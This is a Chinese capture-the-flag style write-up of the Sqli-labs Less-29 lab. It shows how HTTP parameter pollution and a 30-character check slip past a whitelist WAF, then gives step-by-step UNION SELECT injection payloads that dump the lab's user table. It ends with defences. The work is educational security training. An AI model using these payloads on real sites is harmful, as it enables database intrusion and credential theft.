## 题目: Sqli-labs Less-29

## 题目描述
页面提示 This Site Protected by World's Best Firewall，底部还有 Hint: The Query String you input is: ... 回显。这关不再是“把关键词变形”，而是要在白名单 WAF 下面把数据偷出来。
**防御机制**：
1. 白名单：^\d+$，只允许纯数字；
2. WAF 只看第一个 id，且只取 = 后前 30 个字符；
3. PHP 的 $_GET['id'] 取最后一个同名参数。

## 核心原理与绕过策略
* 发现 1：检查的值 ≠ 执行的值
 同一个查询串被解析了两遍：
```
?id=1&id=-1' union select 1,database(),3--+
     │                    │
     │                    └─ PHP 用最后一个 → 进 SQL
     └─ WAF 只看第一个 → "1" 是纯数字 → 放行
```
这是典型的 HTTP 参数污染（HPP）：WAF 和业务代码对“重复参数取哪个”的规则不一致。PHP 取最后一个，Java/Tomcat 取第一个——java_implimentation() 这个函数名和注释就是在模拟 Java 容器的行为，页面底部还贴了 OWASP 的 HPP 论文链接。

* 发现 2：只校验前 30 个字符
 substr($value, 3, 30) 意味着 WAF 只看到 id= 后面的前 30 个字符。只要这 30 个字符全是数字，后面接什么它都不管。

* 发现 3：header() 后面没有 exit
whitelist() 里 header('Location: hacked.php') 之后没有 exit / die，PHP 会继续执行，SQL 照跑、结果照打印。浏览器收到 302 会自动跳走，但响应体里其实已经有注入结果了。
**绕过策略：**
- 主攻：?id=1&id=<payload>，把“给 WAF 看的数字”和“给 SQL 用的 payload”拆成两个参数；
- 备选一：?id= + 30 个以上数字 + '<payload>，利用 30 字符截断；
- 备选二：不跟随跳转，直接读 302 的响应体。

## 解题步骤
1. 确认 WAF 在工作
- 拼接：`?id=1`
- 现象：Your Login name:Dumb（200）
- 拼接：login.php?id=1'
- 现象：302，Location: hacked.php，浏览器跳到“打脸图”页面

2. 证明 PHP 取的是最后一个参数
- 拼接：`?id=1&id=2`
- 现象：回显 Angelina（id=2 的用户），说明 $_GET['id'] 拿到的是 2，不是 1。
这一步是整道题的地基，先验证再往下走。

3. HPP 打通注入
- 拼接：`?id=1&id=1'`
- 现象：状态码回到 200，并回显 SQL 报错：
`You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1' at line 1`
WAF 看 1 放行，SQL 拿到 1' 报错 —— 绕过成功。

4. 判断列数
- 拼接：`?id=1&id=1'%20order%20by%203--+`
- 现象：Your Login name:Dumb（3 列存在）
- 拼接：login.php?id=1&id=1'%20order%20by%204--+
- 现象：Unknown column '4' in 'order clause'（第 4 列不存在）
--+ 里的 + 会被 PHP 解码成空格，等价于 -- ，是合法注释。
  
5. 找字段回显位
- 拼接：`login.php?id=1&id=-1'%20union%20select%201,2,3--+`
- 现象：Your Login name:2、Your Password:3
第 2、3 列回显；-1 让前半段查空，避免真实用户占掉 LIMIT 0,1 的唯一名额。

6. 爆库名、版本、用户
- `?id=1&id=-1'%20union%20select%201,database(),3--+ → security`
- `?id=1&id=-1'%20union%20select%201,concat(version(),0x7c,user()),3--+ → 5.7.26|root@localhost`

7. 爆表名、字段名
- 表名：
`?id=1&id=-1'%20union%20select%201,group_concat(table_name),3
%20from%20information_schema.tables%20where%20table_schema=database()--+`
回显：`emails,referers,uagents,users`
- 字段名（0x7573657273 就是 users）：
  `?id=1&id=-1'%20union%20select%201,group_concat(column_name),3
    %20from%20information_schema.columns
    %20where%20table_schema=database()%20and%20table_name=0x7573657273--+`
回显：`id,username,password`

8. 终极脱库
  `?id=1&id=-1'%20union%20select%201,group_concat(username,0x3a,password),3
    %20from%20users--+`
0x3a 是冒号。实测回显（共 16 条）：
```
Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,
superman:genious,batman:mob!le,admin:888888,admin1:admin1,admin2:admin2,
admin3:admin3,dhakkan:dumbo,admin4:admin4,test'#:123456,admin'--+:123456,
admin'#:123456
```
拿到 admin:888888，通关。


## 知识点总结
1. HPP（HTTP 参数污染）：同名参数出现多次时，各语言取值规则不同——PHP 取最后一个，Java/Tomcat 取第一个，ASP.NET 逗号拼接，Node 变数组。只要“检查组件”和“执行组件”不一致，就能构造出两个不同的值。
2. 解析器差异（Parser Differential）：WAF 用手写 explode("&") 解析，后端用 parse_str() 解析，两者的边界处理必然不同。任何“字符串层面检查、框架层面执行”的防护，都要先问：它们看到的是同一个东西吗？
3. 白名单也会被绕过：^\d+$ 本身很严，但它校验的是 $id1（WAF 解析出来的值），不是 $id（真正执行的值）——检查对象错了，比规则太松更致命。
4. 校验不完整：substr(...,3,30) 只看了前 30 个字符，数字填充即可绕过。校验要么全量，要么先规范化。
5. header() 后必须 exit：跳转只是通知浏览器，不加 exit 代码会继续跑，形成“假拦截”。
6. 联合查询流程：闭合判断 → ORDER BY 定列数 → UNION SELECT 找回显位 → information_schema 拿表/字段 → group_concat 拖数据。这关模板是 id='$id'，闭合符是 '，LIMIT 0,1 决定了要用 -1。
7. 编码细节：--+ 的 + 解码为空格；# 要写 %23；0x3a 是冒号、0x7573657273 是 users。
8. 防御：参数化查询（治本）、intval() 强制数字、WAF 用与后端一致的解析逻辑、拦截后 exit、关错误回显、数据库最小权限、日志告警。
